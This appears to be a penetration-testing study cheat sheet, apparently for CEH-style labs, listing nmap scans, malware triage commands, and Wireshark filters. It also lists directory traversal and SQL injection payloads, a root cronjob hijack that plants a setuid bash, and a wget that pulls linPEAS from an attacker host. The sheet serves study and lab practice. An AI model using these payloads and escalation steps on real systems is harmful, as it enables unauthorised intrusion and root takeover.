# MISC Notes

- nmap
  ```bash
  nmap -sC -sV -O -A -p- --min-rate=1000 <TARGET-IP>      #aggressive 
  nmap -T4 -F --min-rate=1000 <TARGET-IP>      #faster
  nmap -sn 10.10.55.0/24 --script=mac-lookup    #mac look 
  nmap -p 143,993 --script banner 192.168.44.0/24    #banner check 
  nmap --script ldap-rootdse,smb-os-discovery -Pn 10.10.55.0/24    #DC
  ```
- `ldapsearch -x -h <DC-IP> -s base namingContexts`
- base64 decoder command: `echo "base64_string" | base64 -d`
- file readers
  ```bash
  stat <file>    ,    file <file>        #basic
  readelf -h <file>        #elf
  ldd suspicious.elf        #Check Linked Libraries
  strings suspicious.elf | less            #Extract Strings
  chkrootkit <file>        #malicious signature check
  rkhunter --check --rwo      #malicious signature check
  sha384sum <file>      #SHA check
  ```

- directory traversal payloads in URL parameters, for example:  
  - If there's a page parameter: `?page=../../../foldername/prod/`
  - If there's a file parameter: `?file=../../../foldername/prod/file.txt`
- SQL injection
  - checking that
      `sqlmap -u "http://<url>/login.php" --data="username=<user>&password=<pass>" --batch --dbs`
  - for getting a file
      `UNION SELECT LOAD_FILE('C:/wamp64/www/DVWA/SecureWeb/prod/file.txt')`
- Finding hidden files `gobuster dir -u http://training.cehorg.com -w /usr/share/wordlists/dirb/common.txt -x txt,php,html`

- Way to get a page `curl http://<url>?page_id=44`  
`curl "http://<url>?page_id=32' OR '1'='1"` #If page content changes, it's vulnerable to SQLi.  
- Dump: `wget -qO- "http://<url>?page_id=6" | grep -i "text  "`

- Malware find:
```ps
ps> dumpbin /headers malware.exe | findstr /i "text"

ps> diec "C:\Users\Admin\Documents\Ghostware.exe"
```
- Use steghide for steganography extraction and dumpbin for EXE/DLL analysis.
- SHA calculation `sha1sum extracted_image.jpg` `certutil -hashfile C:\Users\path\extracted_image.jpg SHA1`
- Traffic packets:
```wireshark
#SYN Flood (DDoS)
tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == <ip>

#OS find
dhcp.option.hostname contains "Windows"
http.user_agent contains "Windows"
```
- RAT related ports
`nmap -p 4444,8080,3389,5900 10.10.55.0/24`  
  4444	Metasploit Meterpreter  
  8080	njRAT, DarkComet, QuasarRAT  
  3389	RDP (May be used as a RAT)  
  5900	VNC (Remote Desktop RATs)  
  2222	Poison Ivy  

- Linux: Check Cron Jobs (Persistence)
```bash
crontab -l
ls -la /etc/cron*
```

- Key Encryption of file:
```bash
7z e pixelpioneer.txt -p"password"

openssl enc -d -aes-256-cbc -in pixelpioneer.txt -out decrypted.txt -k password
cat decrypted.txt

gpg --decrypt --passphrase "password" pixelpioneer.txt
```
- Privalege
  linPEAS - https://github.com/peass-ng/PEASS-ng/releases
  GTFO - https://gtfobins.github.io  
  ```bash
  sudo -l
  sudo -u user2 /bin/bash

  /root/.ssh        #check this file access
  ssh root@<ip> -i filewithopensshtext
  /var/www/html/files>       #webserver's check

  #cronjob file edit if running via root
  echo '#!/bin/bash' > /usr/local/bin/backup.sh
  echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup.sh
  chmod +x /usr/local/bin/backup.sh
  /tmp/rootbash -p
  ```
- File transfer between
  ```bash
  #in source working folder
  python3 -m http.server 8080

  #in destination machine folder
  wget http://<ATTACKER-IP>:8080/linpeas.sh
  ```
